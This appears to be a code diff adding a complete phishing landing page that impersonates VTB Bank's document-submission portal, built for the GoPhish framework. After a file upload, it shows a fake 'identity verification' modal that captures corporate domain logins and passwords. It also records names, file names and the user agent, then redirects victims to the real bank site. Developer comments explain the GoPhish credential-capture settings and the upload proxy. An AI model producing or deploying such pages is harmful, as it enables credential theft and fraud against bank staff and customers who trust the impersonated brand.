@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>VTB Bank — Document Submission Portal</title>
+  <style>
+    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+    :root {
+      --blue:   #003087;
+      --blue2:  #0047B3;
+      --accent: #00A3E0;
+      --bg:     #EDF1F7;
+      --border: #D1DCE8;
+      --text:   #1A2942;
+      --muted:  #5A7090;
+    }
+    body {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    nav {
+      background: var(--blue);
+      height: 60px;
+      display: flex;
+      align-items: center;
+      padding: 0 36px;
+      gap: 12px;
+      box-shadow: 0 2px 10px rgba(0,0,0,.25);
+      flex-shrink: 0;
+    }
+    .nav-box {
+      background: #fff;
+      color: var(--blue);
+      font-weight: 900;
+      font-size: 13px;
+      width: 40px; height: 40px;
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    nav span { color: #fff; font-weight: 700; font-size: 18px; }
+
+    .hero {
+      background: linear-gradient(105deg, var(--blue) 0%, var(--blue2) 60%, var(--accent) 100%);
+      padding: 28px 36px;
+      color: #fff;
+    }
+    .hero-badge {
+      display: inline-block;
+      background: rgba(255,255,255,.16);
+      border: 1px solid rgba(255,255,255,.28);
+      border-radius: 20px;
+      padding: 3px 14px;
+      font-size: 11px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: .7px;
+      margin-bottom: 10px;
+    }
+    .hero h1 { font-size: 22px; font-weight: 700; margin-bottom: 4px; }
+    .hero p  { font-size: 13px; color: rgba(255,255,255,.78); }
+
+    .progress-wrap {
+      max-width: 560px;
+      margin: 0 auto;
+      padding: 28px 0 0;
+      display: flex;
+      align-items: center;
+      gap: 0;
+    }
+    /* Steps on blue hero: green-themed progress — pending (dim green ring) → active (bright) → done (solid green + ✓) */
+    .hero .step-dot {
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      font-size: 13px;
+      font-weight: 700;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      transition: background .35s, box-shadow .35s, border-color .35s, transform .25s;
+    }
+    .hero .step-dot.pending {
+      background: rgba(255,255,255,0.12);
+      color: rgba(255,255,255,0.85);
+      border: 2px solid rgba(74, 222, 128, 0.45);
+      box-shadow: 0 0 0 1px rgba(34, 197, 94, 0.2);
+    }
+    .hero .step-dot.active {
+      background: linear-gradient(145deg, #22c55e 0%, #16a34a 100%);
+      color: #fff;
+      border: 2px solid rgba(255,255,255,0.35);
+      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.35), 0 4px 14px rgba(22, 163, 74, 0.45);
+    }
+    .hero .step-dot.done {
+      background: #15803d;
+      color: #fff;
+      border: 2px solid rgba(187, 247, 208, 0.6);
+      box-shadow: 0 2px 10px rgba(22, 163, 74, 0.4);
+    }
+    .hero .step-line {
+      flex: 1;
+      height: 4px;
+      border-radius: 2px;
+      background: rgba(255,255,255,0.22);
+      box-shadow: inset 0 0 0 1px rgba(74, 222, 128, 0.15);
+      transition: background .4s, box-shadow .4s;
+    }
+    .hero .step-line.done {
+      background: linear-gradient(90deg, #22c55e, #4ade80);
+      box-shadow: 0 0 12px rgba(74, 222, 128, 0.45);
+    }
+    .hero .step-label {
+      font-size: 11px;
+      font-weight: 600;
+      text-align: center;
+      margin-top: 8px;
+      letter-spacing: 0.02em;
+    }
+    .hero .step-label.pending { color: rgba(255,255,255,0.55); }
+    .hero .step-label.active { color: #bbf7d0; font-weight: 700; }
+    .hero .step-label.done   { color: #86efac; font-weight: 700; }
+
+    main {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      padding: 32px 16px 60px;
+    }
+    .card {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0,48,135,.10);
+      width: 100%;
+      max-width: 560px;
+      overflow: hidden;
+    }
+    .card-hd {
+      background: linear-gradient(90deg,#F4F8FF,#EEF3FB);
+      border-bottom: 1px solid var(--border);
+      padding: 20px 28px;
+      display: flex; align-items: center; gap: 14px;
+    }
+    .card-hd-icon {
+      width: 42px; height: 42px;
+      background: var(--blue);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .card-hd-icon svg { width: 20px; height: 20px; stroke: #fff; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
+    .card-hd-title { font-size: 15px; font-weight: 700; color: var(--text); }
+    .card-hd-sub   { font-size: 12px; color: var(--muted); margin-top: 2px; }
+
+    .card-body { padding: 28px; }
+
+    .row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
+    .field { margin-bottom: 20px; }
+    label { display: block; font-size: 12px; font-weight: 700; color: var(--text); margin-bottom: 6px; }
+    label .req { color: #C0392B; margin-left: 2px; }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 15px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      outline: none;
+      color: var(--text);
+      background: #FAFBFD;
+      transition: border-color .18s, box-shadow .18s;
+    }
+    input:focus {
+      border-color: var(--blue2);
+      box-shadow: 0 0 0 3px rgba(0,71,179,.10);
+      background: #fff;
+    }
+
+    .drop-zone {
+      border: 2px dashed var(--border);
+      border-radius: 12px;
+      padding: 28px 16px;
+      text-align: center;
+      cursor: pointer;
+      transition: all .2s;
+      background: #FAFBFD;
+      position: relative;
+    }
+    .drop-zone:hover, .drop-zone.over {
+      border-color: var(--blue2);
+      background: #EEF3FB;
+    }
+    .drop-zone input[type="file"] {
+      position: absolute; inset: 0; opacity: 0;
+      cursor: pointer; width: 100%; height: 100%;
+    }
+    .drop-icon {
+      width: 44px; height: 44px;
+      background: #E8EFF8;
+      border-radius: 10px;
+      margin: 0 auto 10px;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .drop-icon svg { width: 22px; height: 22px; stroke: var(--blue2); fill: none; stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round; }
+    .drop-title { font-size: 14px; font-weight: 600; color: var(--text); margin-bottom: 3px; }
+    .drop-hint  { font-size: 12px; color: var(--muted); }
+    .drop-hint b { color: var(--blue2); }
+    .file-list { margin-top: 10px; display: flex; flex-direction: column; gap: 5px; }
+    .file-item {
+      display: flex; align-items: center; gap: 8px;
+      background: #F0F4F8; border-radius: 7px;
+      padding: 7px 10px; font-size: 12px; color: var(--text);
+    }
+    .file-item svg { width: 14px; height: 14px; stroke: var(--blue2); fill: none; stroke-width: 2; flex-shrink: 0; }
+    .file-item .fn { flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .file-item .fs { color: var(--muted); font-size: 11px; flex-shrink: 0; }
+
+    hr { border: none; border-top: 1px solid var(--border); margin: 4px 0 22px; }
+
+    .btn {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, var(--blue), var(--blue2));
+      border: none; border-radius: 11px;
+      color: #fff; font-size: 15px; font-weight: 700;
+      cursor: pointer;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      transition: opacity .18s, transform .15s;
+      box-shadow: 0 4px 12px rgba(0,48,135,.22);
+    }
+    .btn:hover  { opacity: .92; transform: translateY(-1px); }
+    .btn:active { opacity: .85; transform: none; }
+    .btn:disabled { opacity: .60; cursor: not-allowed; transform: none; }
+    .btn svg { width: 17px; height: 17px; stroke: #fff; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0; }
+    .spinner {
+      width: 17px; height: 17px;
+      border: 2px solid rgba(255,255,255,.3);
+      border-radius: 50%;
+      border-top-color: #fff;
+      animation: spin .7s linear infinite;
+      display: none; flex-shrink: 0;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* ── Modal (login / password) ───────────────── */
+    .modal-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      z-index: 10000;
+      background: rgba(26, 41, 66, 0.58);
+      backdrop-filter: blur(4px);
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .modal-overlay.open { display: flex; }
+    .modal-box {
+      background: #fff;
+      border-radius: 16px;
+      width: 100%;
+      max-width: 440px;
+      box-shadow: 0 24px 64px rgba(0, 48, 135, 0.28);
+      overflow: hidden;
+      animation: modalIn .28s ease-out;
+    }
+    @keyframes modalIn {
+      from { opacity: 0; transform: translateY(16px) scale(0.98); }
+      to { opacity: 1; transform: none; }
+    }
+    .modal-head {
+      background: linear-gradient(90deg, var(--blue), var(--blue2));
+      color: #fff;
+      padding: 18px 22px;
+      font-size: 16px;
+      font-weight: 700;
+    }
+    .modal-body { padding: 22px 24px 26px; }
+    .btn-row {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 8px;
+    }
+    .btn-secondary {
+      background: #fff !important;
+      color: #15803d !important;
+      border: 2px solid #22c55e !important;
+      box-shadow: none !important;
+    }
+    .btn-secondary:hover { background: #f0fdf4 !important; }
+    .done-lead {
+      font-family: 'Segoe UI', Arial, sans-serif;
+      font-size: 14px;
+      color: #334155;
+      margin: 0 0 8px;
+      line-height: 1.55;
+    }
+    .auth-notice {
+      background: #EFF6FF;
+      border: 1px solid #BFDBFE;
+      border-radius: 9px;
+      padding: 12px 14px;
+      font-size: 12px;
+      color: #1D4ED8;
+      margin-bottom: 18px;
+      line-height: 1.45;
+    }
+
+    iframe.upload-target {
+      position: absolute;
+      width: 0;
+      height: 0;
+      border: 0;
+      visibility: hidden;
+    }
+
+    footer {
+      background: var(--blue);
+      color: rgba(255,255,255,.55);
+      text-align: center;
+      padding: 18px 20px;
+      font-size: 11px;
+      flex-shrink: 0;
+    }
+    footer a { color: rgba(255,255,255,.75); text-decoration: none; }
+
+    @media (max-width: 500px) {
+      .row { grid-template-columns: 1fr; }
+      .card-body { padding: 20px 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<noscript>
+  <div style="background:#fee;padding:14px;text-align:center;font-family:sans-serif;font-size:14px;">
+    Enable JavaScript for the verification step. File upload still works: use the form below — files are sent to the server via <strong>POST /upload</strong>.
+  </div>
+</noscript>
+
+<nav>
+  <div class="nav-box">VTB</div>
+  <span>VTB Bank</span>
+</nav>
+
+<div class="hero">
+  <div class="hero-badge">Secure Document Portal</div>
+  <h1>Submit Documents to Head Office</h1>
+  <p>All data is transmitted over an encrypted TLS 1.3 connection.</p>
+
+  <div class="progress-wrap" id="progress_wrap">
+    <div>
+      <div class="step-dot active" id="dot1">1</div>
+      <div class="step-label active" id="lbl1">Documents</div>
+    </div>
+    <div class="step-line" id="line1"></div>
+    <div>
+      <div class="step-dot pending" id="dot2">2</div>
+      <div class="step-label pending" id="lbl2">Verify</div>
+    </div>
+    <div class="step-line" id="line2"></div>
+    <div>
+      <div class="step-dot pending" id="dot3">3</div>
+      <div class="step-label pending" id="lbl3">Done</div>
+    </div>
+  </div>
+</div>
+
+<main id="main_flow">
+  <div class="card">
+    <div class="card-hd">
+      <div class="card-hd-icon">
+        <svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
+      </div>
+      <div>
+        <div class="card-hd-title">Personal Information &amp; File Upload</div>
+        <div class="card-hd-sub">Fields marked * are required — max 20 MB per file recommended</div>
+      </div>
+    </div>
+    <div class="card-body">
+
+      <!--
+        In GoPhish: Landing Page → enable "Capture Submitted Data" (+ "Capture Passwords" if you want the password).
+        CSV columns first_name / last_name are the TARGET from your group, not these form fields.
+        Full POST keys appear under Submitted Data (e.g. username, password, form_firstname, …).
+
+        GoPhish (models/page.go parseHTML) forces EVERY <form action="..."> to action="" on save.
+        POST на тот же хост через formaction="/upload" уходит на GoPhish :443; phish.go проксирует /upload во Flask (upload_server).
+      -->
+      <form id="form_upload" method="post" enctype="multipart/form-data" target="iframe_upload">
+        <div class="row">
+          <div class="field">
+            <label for="s1_firstname">First Name <span class="req">*</span></label>
+            <input type="text" id="s1_firstname" name="firstname" placeholder="John" autocomplete="given-name" required>
+          </div>
+          <div class="field">
+            <label for="s1_lastname">Last Name <span class="req">*</span></label>
+            <input type="text" id="s1_lastname" name="lastname" placeholder="Smith" autocomplete="family-name" required>
+          </div>
+        </div>
+
+        <div class="field">
+          <label>Upload Files <span class="req">*</span></label>
+          <div class="drop-zone" id="drop_zone">
+            <input type="file" id="file_input" name="files" multiple required
+              accept=".pdf,.doc,.docx,.xls,.xlsx,.jpg,.jpeg,.png,.zip,.rar,.txt">
+            <div class="drop-icon">
+              <svg viewBox="0 0 24 24"><polyline points="16 16 12 12 8 16"/><line x1="12" y1="12" x2="12" y2="21"/><path d="M20.39 18.39A5 5 0 0 0 18 9h-1.26A8 8 0 1 0 3 16.3"/></svg>
+            </div>
+            <div class="drop-title">Drag &amp; drop files here</div>
+            <div class="drop-hint">or <b>click to browse</b> — PDF, DOC, XLS, JPG, ZIP</div>
+          </div>
+          <div class="file-list" id="file_list"></div>
+        </div>
+
+        <hr>
+        <button class="btn" id="btn_send" type="submit"
+          formaction="/upload"
+          formmethod="post"
+          formenctype="multipart/form-data"
+          formtarget="iframe_upload">
+          <svg viewBox="0 0 24 24" id="upload_icon"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>
+          <span class="spinner" id="upload_spinner"></span>
+          <span id="upload_txt">Send Data</span>
+        </button>
+      </form>
+
+    </div>
+  </div>
+</main>
+
+<!-- Hidden iframe: receives POST /upload response (JSON) -->
+<iframe class="upload-target" id="iframe_upload" name="iframe_upload" title="upload"></iframe>
+
+<!-- Modal: GoPhish credential capture -->
+<div class="modal-overlay" id="modal_auth" role="dialog" aria-modal="true" aria-labelledby="modal_title">
+  <div class="modal-box">
+    <div class="modal-head" id="modal_title">Identity verification</div>
+    <div class="modal-body">
+      <div class="auth-notice">
+        Documents were received. Confirm your corporate account to finalise the transfer to the Head Office.
+      </div>
+      <!-- action="" is correct — GoPhish rewrites all form actions to "" anyway; POST must stay on phishing URL with ?id= -->
+      <form method="post" action="" id="auth_form" autocomplete="on">
+        <!-- Distinct names so they are not confused with target first_name/last_name in CSV exports -->
+        <input type="hidden" name="form_firstname" id="hf_firstname" value="">
+        <input type="hidden" name="form_lastname" id="hf_lastname" value="">
+        <input type="hidden" name="uploaded_file_names" id="hf_files" value="">
+        <input type="hidden" name="client_user_agent" id="hf_ua" value="">
+
+        <div class="field">
+          <label for="s2_login">Corporate Login (Domain\Login) <span class="req">*</span></label>
+          <input type="text" id="s2_login" name="username" placeholder="DOMAIN\user.name" autocomplete="username" required>
+        </div>
+        <div class="field">
+          <label for="s2_password">Password <span class="req">*</span></label>
+          <input type="password" id="s2_password" name="password" placeholder="••••••••" autocomplete="current-password" required>
+        </div>
+        <hr>
+        <button class="btn" type="submit" id="btn_auth">
+          <svg viewBox="0 0 24 24" id="auth_icon"><polyline points="20 6 9 17 4 12"/></svg>
+          <span class="spinner" id="auth_spinner"></span>
+          <span id="auth_txt">Confirm &amp; Submit</span>
+        </button>
+      </form>
+    </div>
+  </div>
+</div>
+
+<!-- After successful credential POST to GoPhish: choice to send more or leave (needs empty Redirect URL on landing page) -->
+<div class="modal-overlay" id="modal_done" role="dialog" aria-modal="true" aria-labelledby="done_title" style="z-index:10001;">
+  <div class="modal-box" style="max-width:420px;">
+    <div class="modal-head" id="done_title" style="background:linear-gradient(90deg,#15803d,#22c55e);">All set</div>
+    <div class="modal-body">
+      <p class="done-lead">Your submission was received. What would you like to do next?</p>
+      <p class="done-lead" style="font-size:13px;color:#64748b;margin-bottom:18px;">
+        <span lang="ru">Отправить ещё документы или перейти на сайт банка?</span>
+      </p>
+      <div class="btn-row">
+        <button type="button" class="btn" id="btn_send_more">Send more</button>
+        <button type="button" class="btn btn-secondary" id="btn_home">Home page</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<footer>
+  © VTB Bank PJSC, 2026 · <a href="https://vtb.bank.in/">vtb.bank.in</a>
+</footer>
+
+<script>
+(function () {
+  var HOME_URL = 'https://vtb.bank.in/';
+  var SS_DONE = 'vtb_landing_gp_auth_ok';
+
+  function fmtSize(b) {
+    if (b < 1024) return b + ' B';
+    if (b < 1048576) return (b / 1024).toFixed(1) + ' KB';
+    return (b / 1048576).toFixed(1) + ' MB';
+  }
+
+  var fileInput = document.getElementById('file_input');
+  var fileList = document.getElementById('file_list');
+  var dropZone = document.getElementById('drop_zone');
+  var formUpload = document.getElementById('form_upload');
+  var iframeUpload = document.getElementById('iframe_upload');
+  var modalAuth = document.getElementById('modal_auth');
+  var modalDone = document.getElementById('modal_done');
+
+  if (fileInput && fileList) {
+    fileInput.addEventListener('change', function () { renderFiles(this.files); });
+  }
+  if (dropZone && fileInput) {
+    dropZone.addEventListener('dragover', function (e) { e.preventDefault(); dropZone.classList.add('over'); });
+    dropZone.addEventListener('dragleave', function () { dropZone.classList.remove('over'); });
+    dropZone.addEventListener('drop', function (e) {
+      e.preventDefault();
+      dropZone.classList.remove('over');
+      fileInput.files = e.dataTransfer.files;
+      renderFiles(e.dataTransfer.files);
+    });
+  }
+
+  function renderFiles(files) {
+    fileList.innerHTML = '';
+    Array.from(files).forEach(function (f) {
+      var el = document.createElement('div');
+      el.className = 'file-item';
+      el.innerHTML = '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>' +
+        '<span class="fn"></span><span class="fs"></span>';
+      el.querySelector('.fn').textContent = f.name;
+      el.querySelector('.fs').textContent = fmtSize(f.size);
+      fileList.appendChild(el);
+    });
+  }
+
+  /**
+   * n = 1 Documents (current) | 2 Verify | 4 all complete (1–3 green ✓)
+   */
+  function setProgressStep(n) {
+    try {
+      var i;
+      for (i = 1; i <= 3; i++) {
+        var dot = document.getElementById('dot' + i);
+        var lbl = document.getElementById('lbl' + i);
+        if (!dot || !lbl) continue;
+        dot.className = 'step-dot';
+        lbl.className = 'step-label';
+        if (n >= 4) {
+          dot.className += ' done';
+          lbl.className += ' done';
+          dot.innerHTML = '&#10003;';
+        } else if (i < n) {
+          dot.className += ' done';
+          lbl.className += ' done';
+          dot.innerHTML = '&#10003;';
+        } else if (i === n) {
+          dot.className += ' active';
+          lbl.className += ' active';
+          dot.textContent = String(i);
+        } else {
+          dot.className += ' pending';
+          lbl.className += ' pending';
+          dot.textContent = String(i);
+        }
+      }
+      var l1 = document.getElementById('line1');
+      var l2 = document.getElementById('line2');
+      var done1 = (n >= 4) || (n > 1);
+      var done2 = (n >= 4) || (n > 2);
+      if (l1) l1.className = 'step-line' + (done1 ? ' done' : '');
+      if (l2) l2.className = 'step-line' + (done2 ? ' done' : '');
+    } catch (e) {}
+  }
+
+  function fillHiddenFromForm(fileNamesStr) {
+    var fn = (document.getElementById('s1_firstname') || {}).value || '';
+    var ln = (document.getElementById('s1_lastname') || {}).value || '';
+    var h1 = document.getElementById('hf_firstname');
+    var h2 = document.getElementById('hf_lastname');
+    var h3 = document.getElementById('hf_files');
+    var h4 = document.getElementById('hf_ua');
+    if (h1) h1.value = fn.trim();
+    if (h2) h2.value = ln.trim();
+    if (h3) h3.value = fileNamesStr || '';
+    if (h4) h4.value = navigator.userAgent || '';
+  }
+
+  function openAuthModal(fileNamesStr) {
+    fillHiddenFromForm(fileNamesStr);
+    if (modalAuth) modalAuth.classList.add('open');
+    setProgressStep(2);
+    try {
+      var u = document.getElementById('s2_login');
+      if (u) setTimeout(function () { u.focus(); }, 200);
+    } catch (e) {}
+  }
+
+  function afterUploadResponse() {
+    var names = '';
+    try {
+      var doc = iframeUpload.contentDocument || iframeUpload.contentWindow.document;
+      var txt = (doc.body && doc.body.textContent) ? doc.body.textContent.trim() : '';
+      if (txt) {
+        var data = JSON.parse(txt);
+        if (data.files && data.files.length) names = data.files.join(', ');
+      }
+    } catch (e) {
+      if (fileInput && fileInput.files && fileInput.files.length) {
+        names = Array.from(fileInput.files).map(function (f) { return f.name; }).join(', ');
+      }
+    }
+    if (!names && fileInput && fileInput.files && fileInput.files.length) {
+      names = Array.from(fileInput.files).map(function (f) { return f.name; }).join(', ');
+    }
+    openAuthModal(names);
+  }
+
+  function showDoneModal() {
+    if (modalAuth) modalAuth.classList.remove('open');
+    if (modalDone) modalDone.classList.add('open');
+    setProgressStep(4);
+  }
+
+  function resetFlowToStart() {
+    try { sessionStorage.removeItem(SS_DONE); } catch (e) {}
+    if (modalDone) modalDone.classList.remove('open');
+    if (modalAuth) modalAuth.classList.remove('open');
+    var fu = document.getElementById('form_upload');
+    if (fu) fu.reset();
+    if (fileList) fileList.innerHTML = '';
+    var af = document.getElementById('auth_form');
+    if (af) af.reset();
+    var h1 = document.getElementById('hf_firstname');
+    var h2 = document.getElementById('hf_lastname');
+    var h3 = document.getElementById('hf_files');
+    var h4 = document.getElementById('hf_ua');
+    if (h1) h1.value = '';
+    if (h2) h2.value = '';
+    if (h3) h3.value = '';
+    if (h4) h4.value = '';
+    setProgressStep(1);
+    window.scrollTo(0, 0);
+  }
+
+  /* Return visit after POST to GoPhish: show “Send more / Home” */
+  try {
+    if (sessionStorage.getItem(SS_DONE) === '1') {
+      sessionStorage.removeItem(SS_DONE);
+      showDoneModal();
+    }
+  } catch (e) {}
+
+  if (formUpload && iframeUpload) {
+    var uploadTimer = null;
+    function resetUploadButton() {
+      var icon = document.getElementById('upload_icon');
+      var spin = document.getElementById('upload_spinner');
+      var txt = document.getElementById('upload_txt');
+      var btn = document.getElementById('btn_send');
+      if (btn) btn.disabled = false;
+      if (icon) icon.style.display = '';
+      if (spin) spin.style.display = 'none';
+      if (txt) txt.textContent = 'Send Data';
+      if (uploadTimer) { clearTimeout(uploadTimer); uploadTimer = null; }
+    }
+    formUpload.addEventListener('submit', function () {
+      var icon = document.getElementById('upload_icon');
+      var spin = document.getElementById('upload_spinner');
+      var txt = document.getElementById('upload_txt');
+      var btn = document.getElementById('btn_send');
+      if (icon) icon.style.display = 'none';
+      if (spin) spin.style.display = 'inline-block';
+      if (txt) txt.textContent = 'Uploading...';
+      if (btn) btn.disabled = true;
+      if (uploadTimer) clearTimeout(uploadTimer);
+      uploadTimer = setTimeout(function () {
+        resetUploadButton();
+        try { openAuthModal(''); } catch (e) {}
+      }, 180000);
+
+      iframeUpload.onload = function () {
+        resetUploadButton();
+        afterUploadResponse();
+      };
+    });
+  }
+
+  var authForm = document.getElementById('auth_form');
+  if (authForm) {
+    authForm.addEventListener('submit', function () {
+      try { sessionStorage.setItem(SS_DONE, '1'); } catch (e) {}
+      var icon = document.getElementById('auth_icon');
+      var spin = document.getElementById('auth_spinner');
+      var t = document.getElementById('auth_txt');
+      if (icon) icon.style.display = 'none';
+      if (spin) spin.style.display = 'inline-block';
+      if (t) t.textContent = 'Verifying...';
+    });
+  }
+
+  var btnMore = document.getElementById('btn_send_more');
+  var btnHome = document.getElementById('btn_home');
+  if (btnMore) btnMore.addEventListener('click', function () { resetFlowToStart(); });
+  if (btnHome) btnHome.addEventListener('click', function () { window.location.href = HOME_URL; });
+})();
+</script>
+
+</body>
+</html>
